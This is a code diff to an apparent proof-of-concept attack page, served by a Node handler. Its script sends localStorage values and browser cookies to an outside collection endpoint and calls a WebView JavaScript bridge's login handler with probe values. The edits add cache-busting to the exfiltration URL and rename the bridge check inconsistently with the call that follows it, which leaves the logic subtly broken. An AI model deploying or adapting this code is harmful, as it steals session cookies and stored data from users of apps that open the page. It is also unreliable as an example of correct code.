@@ -1,5 +1,6 @@
 module.exports = (req, res) => {
   res.setHeader('Content-Type', 'text/html');
+  res.setHeader('Cache-Control', 'no-store');
   res.send(`<!DOCTYPE html>
 <html><body>
 <script>
@@ -7,7 +8,7 @@ module.exports = (req, res) => {
   var EXFIL = "https://haxor-net.vercel.app/api/log";
   function exfil(data, source) {
     var img = new Image();
-    img.src = EXFIL + "?src=" + source +
+    img.src = EXFIL + "?cb=" + Date.now() + "&src=" + source +
       "&data=" + encodeURIComponent(data) +
       "&cookies=" + encodeURIComponent(document.cookie);
   }
@@ -21,7 +22,7 @@ module.exports = (req, res) => {
         if (v) exfil(v, "ls:" + k);
       });
     } catch (e) {}
-    if (window.WebviewJavascriptBridge && window.WebviewJavascriptBridge.callHandler) {
+    if (window.WebViewJavascriptBridge && window.WebviewJavascriptBridge.callHandler) {
       window.WebviewJavascriptBridge.callHandler("action_login", JSON.stringify({
         userId: "poc_probe", authorization: "poc_probe", refreshToken: "poc_probe"
       }), function (resp) { exfil("bridge_ok:" + JSON.stringify(resp), "bridge"); });
